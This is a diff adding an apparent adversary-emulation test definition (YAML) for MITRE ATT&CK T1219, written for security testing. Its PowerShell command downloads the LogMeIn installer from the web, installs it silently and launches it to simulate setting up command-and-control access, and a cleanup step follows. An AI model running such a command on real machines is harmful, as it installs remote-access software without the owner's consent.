@@ -1,0 +1,26 @@
+---
+- id: f1b3fca18d7465cd10e5a7477a3bf97d
+  name: LogMeIn Files Detected Test on Windows
+  description: 'An adversary may attempt to trick the user into downloading LogMeIn
+    and use to establish C2. Download of LogMeIn installer will be at the destination
+    location and ran when sucessfully executed.
+
+    '
+  tactic: command-and-control
+  technique:
+    attack_id: T1219
+    name: Remote Access Software
+  platforms:
+    windows:
+      psh:
+        command: Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\LogMeInIgnition.msi
+          https://secure.logmein.com/LogMeInIgnition.msi; $file1 = "C:\Users\" + $env:username
+          + "\Desktop\LogMeInIgnition.msi"; Start-Process -Wait $file1 /quiet; Start-Process
+          'C:\Program Files (x86)\LogMeIn Ignition\LMIIgnition.exe' "/S"
+        payloads: []
+        cleanup: get-package *'LogMeIn Client'* -ErrorAction Ignore | uninstall-package
+          ; $file1 = "C:\Users\" + $env:username + "\Desktop\LogMeInIgnition.msi";
+          Remove-Item $file1 -ErrorAction Ignore
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
